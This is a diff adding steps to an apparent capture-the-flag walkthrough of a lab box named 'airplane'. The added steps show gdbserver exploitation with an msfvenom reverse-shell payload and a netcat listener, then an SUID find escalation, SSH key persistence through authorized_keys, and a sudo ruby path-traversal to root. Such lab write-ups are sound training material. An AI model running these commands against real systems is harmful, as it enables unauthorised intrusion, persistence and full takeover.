@@ -1,4 +1,3 @@
-wip
 > Are you ready to fly?
 #### Steps
 1. Started out with an nmap scan `nmap -sV 10.10.101.33 -v`
@@ -47,4 +46,71 @@ for pid in range(1, 1001):
         print(f"Error fetching PID {pid}: {e}")
 ```
 21. Took about 5000000 years to run but it worked!
-22. 
+22. Interesting results:
+```
+374 avahi-daemon: running [airplane.local]
+529 /usr/bin/gdbserver0.0.0.0:6048airplane
+```
+23. Looking into `gdbserver`
+```
+└─$ searchsploit gdbserver                                     
+------------------------------------------------- ---------------------------------
+ Exploit Title                                   |  Path
+------------------------------------------------- ---------------------------------
+GNU gdbserver 9.2 - Remote Command Execution (RC | linux/remote/50539.py
+------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+24. I used metasploit to exploit this
+```shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.13.251 LPORT=7777 PrependFork=true -f elf -o exploit.elf
+```
+25. Make it executable with `chmod +x` and run it with `gdb exploit.elf`
+26. Then on gdb I ran `target extended-remote 10.10.101.33:6048`
+27. Set up a netcat listener on port `7777` (or wtv you choose) then transfer over the shell
+```
+(gdb) remote put exploit.elf /tmp/exploit.elf
+(gdb) set remote exec-file /tmp/exploit.elf
+(gdb) run
+
+└─$ nc -lvnp 7777 
+listening on [any] 7777 ...
+connect to [10.2.13.251] from (UNKNOWN) [10.10.166.15] 39078
+whoami
+hudson
+```
+28. Stabilize the shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+29. There nothing in hudsons dir so we have to move to carlos
+30. No sudo -l (because no passwod) so I checked binary perms first
+31. `/usr/bin/find` showed up which is exploitable (https://gtfobins.github.io/gtfobins/find/)
+32. `find . -exec /bin/sh -p \; -quit`
+33. From there navigate to carlos and grab user.txt
+34. Next privilege escalation
+35. To ssh as carlos:
+```shell
+# host machine
+ssh-keygen
+
+# rev shell
+echo "your public key" >> /home/carlos/.ssh/authorized_keys
+```
+36. `ssh -i` with your private key file
+37. Running `sudo -l`
+```
+carlos@airplane:~$ sudo -l
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+```
+38. gtfobins gives this command `ruby -e 'exec "/bin/sh"'` but since we can only run ruby files in the root directory there has to be a workaround
+39. File traversal! (kinda)
+```
+carlos@airplane:~$ echo 'exec "/bin/sh"' >> /tmp/test.rb
+carlos@airplane:~$ sudo ruby /root/../tmp/test.rb
+# whoami
+root
+```
+40. Done!
